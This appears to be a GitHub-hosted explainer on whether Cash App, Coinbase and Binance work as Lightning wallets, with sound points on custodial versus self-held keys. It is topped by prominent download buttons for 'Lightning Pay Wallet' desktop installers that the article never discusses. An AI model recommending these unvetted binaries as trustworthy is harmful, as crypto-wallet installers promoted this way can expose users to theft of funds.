<p align="center"><img src="assets/banner-article.png" alt="Lightning Pay Wallet"></p>
# Cash App, Coinbase and Binance: are they Lightning wallets?
They can move bitcoin over Lightning in places, but the balance is theirs, not yours.
<p align="center"><a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0350c2?style=for-the-badge&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Windows"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0350c2?style=for-the-badge&logo=apple&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD macOS"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0350c2?style=for-the-badge&logo=linux&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Linux"></a></p>
<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| ![Windows](https://img.shields.io/badge/platform-Windows-fed023?style=flat-square&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640) | Windows 10 (1909) or later, 64-bit | [lightning-pay-wallet-windows-v1.2.1.exe](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-fed023?style=flat-square&logo=apple&logoColor=ffffff&labelColor=091640) | macOS 12 or later | [lightning-pay-wallet-macos-v1.2.1.dmg](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-fed023?style=flat-square&logo=linux&logoColor=ffffff&labelColor=091640) | x64, Ubuntu 20.04 or later, or equivalent | [lightning-pay-wallet-linux-v1.2.1.zip](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip) |

</div>
Every file above is published on [the Lightning Pay Wallet release page](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/tag/v1.2.1) under the same names, and that page is the only place the installers should come from.
> **Only download from this GitHub release page.**

Big consumer apps blur the line, because they can pay a Lightning invoice while holding your bitcoin
for you. The useful question is not "is it a Lightning wallet" but "who holds the keys".

## The distinction that matters

An exchange or payment app that supports Lightning is a custodial service with a Lightning rail. You
send and receive over the network, and the balance sits on their books. That means a login recovers
access, and also that an account restriction, a freeze or a company failure can take the balance.

A non-custodial wallet holds the keys on your device. It cannot freeze you and cannot recover for you.

## What these apps are good at

Buying bitcoin, selling it, and moving value to people who also use the same app. If your counterparty
is on Cash App and you are too, the transfer is trivial. That convenience is real and it is why these
apps exist.

They are also the usual on-ramp: buy there, withdraw to a wallet you control, and use that for
spending.

## Where they fall short

Withdrawal rules, limits and eligibility are set by the app and enforced by its risk systems. A blocked
withdrawal, an ineligible send or a balance that cannot be cashed out is a service decision, not a
wallet fault, and no amount of reinstalling changes it.

Support for the network itself also varies by product and changes over time, so check the deposit or
withdrawal screen for a Lightning option before assuming it is there.

## The practical combination

Keep a small balance in a custodial app if the convenience is worth it to you, and keep the rest in a
wallet whose keys you hold. Move between them deliberately, matching the rail each time.

The custody trade is covered in
[custodial vs non-custodial](https://github.com/bitcoin-lightning-wallet/wallet-recovery-guides/blob/HEAD/custodial-vs-non-custodial-wallet.md).

## Questions people ask

### Is Cash App a Lightning wallet?

It can move bitcoin over Lightning in some configurations, and the balance is custodial.

### Can I send from my wallet to Coinbase?

Yes, using the deposit method Coinbase gives you: an address for on-chain, an invoice for Lightning.

### Why is my withdrawal blocked?

That is the service's decision about your account. It is not something the wallet can see or fix.

## Related guides

- [Which bitcoin apps have a Lightning wallet built in](https://github.com/bitcoin-lightning-wallet/lightning-wallet-basics/blob/HEAD/which-bitcoin-apps-have-lightning.md)
- [Which wallets support Lightning, compared by what they actually do](https://github.com/bitcoin-lightning-wallet/lightning-wallet-basics/blob/HEAD/which-wallets-support-lightning.md)

